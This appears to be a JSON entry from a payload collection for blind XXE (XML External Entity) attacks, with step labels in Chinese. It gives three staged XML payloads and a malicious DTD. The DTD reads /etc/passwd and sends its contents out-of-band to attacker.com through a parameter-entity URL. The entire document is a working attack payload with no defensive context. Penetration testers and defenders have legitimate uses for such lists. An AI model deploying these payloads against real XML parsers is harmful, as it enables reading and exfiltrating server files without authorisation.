        {
          "id": "f2083014-1b2b-4f0d-9225-c4f447862899",
          "name": "盲XXE",
          "entries": [
            {
              "id": "26dbe1d0-74c6-4d5f-ba7a-419efd6f87b8",
              "title": "payload",
              "payload": "# STEP 1 - 1. 外部实体探测\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY xxe SYSTEM \"http://attacker.com/xxe\"\u003e\n]\u003e\n\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e\n\n# STEP 2 - 2. 参数实体\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"\u003e\n%xxe;\n]\u003e\n\u003cfoo\u003etest\u003c/foo\u003e\n\n# STEP 3 - 3. OOB外带数据\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"\u003e\n%xxe;\n]\u003e\n\u003cfoo\u003etest\u003c/foo\u003e\n\n# xxe.dtd内容\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e\n\u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM \u0027http://attacker.com/?d\u003d%file;\u0027\u003e\"\u003e\n%eval;\n%exfil;"
            }
          ]
        }
